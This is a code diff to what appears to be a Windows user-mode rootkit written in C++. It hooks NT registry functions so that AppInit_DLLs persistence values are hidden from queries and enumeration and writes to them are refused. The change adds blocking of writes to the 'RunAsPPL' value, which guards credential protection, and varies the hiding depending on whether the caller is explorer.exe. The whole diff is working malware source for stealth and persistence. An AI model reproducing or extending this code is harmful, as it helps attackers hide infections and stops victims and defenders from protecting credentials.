@@ -17,7 +17,7 @@ NTSTATUS WINAPI HookedNtSetValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName,
     if (ValueName->Length > 3)
     {
         std::wstring w_name = std::wstring(ValueName->Buffer);
-        if (CheckExistsW(w_name, APPINIT, false) || CheckExistsW(w_name, KEY, false)) 
+        if (CheckExistsW(w_name, APPINIT, false) || CheckExistsW(w_name, KEY, false) || CheckExistsW(w_name, L"runasppl", false))
             return STATUS_ACCESS_DENIED;
     }
 
@@ -29,8 +29,17 @@ NTSTATUS WINAPI HookedNtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueNam
     if (ValueName->Length > 3)
     {
         std::wstring w_name = std::wstring(ValueName->Buffer);
-        if (CheckExistsW(w_name, APPINIT, false) || CheckExistsW(w_name, KEY, false))
-            return STATUS_OBJECT_NAME_NOT_FOUND;
+        char path[MAX_PATH] = { 0 };
+        if (GetProcessImageFileNameA(GetCurrentProcess(), path, MAX_PATH) && CheckExistsA(path, "explorer.exe", false))
+        {
+            if (CheckExistsW(w_name, APPINIT, false))
+                return STATUS_OBJECT_NAME_NOT_FOUND;
+        }
+        else
+        {
+            if (CheckExistsW(w_name, APPINIT, false) || CheckExistsW(w_name, KEY, false))
+                return STATUS_OBJECT_NAME_NOT_FOUND;
+        }
     }
     return OriginalNtQueryValueKey(KeyHandle, ValueName, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
 }
@@ -47,8 +56,17 @@ NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_
             status = OriginalNtEnumerateValueKey(key, i, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
 
             std::wstring w_name = std::wstring(KeyValueInformationGetName(keyValueInformation, keyValueInformationClass));
-            if (CheckExistsW(w_name, APPINIT, true) && CheckExistsW(w_name, KEY, true))
-                newIndex++;
+            char path[MAX_PATH] = { 0 };
+            if (GetProcessImageFileNameA(GetCurrentProcess(), path, MAX_PATH) && CheckExistsA(path, "explorer.exe", false))
+            {
+                if (CheckExistsW(w_name, APPINIT, true))
+                    newIndex++;
+            }
+            else
+            {
+                if (CheckExistsW(w_name, APPINIT, true) && CheckExistsW(w_name, KEY, true))
+                    newIndex++;
+            }
         }
     }
 
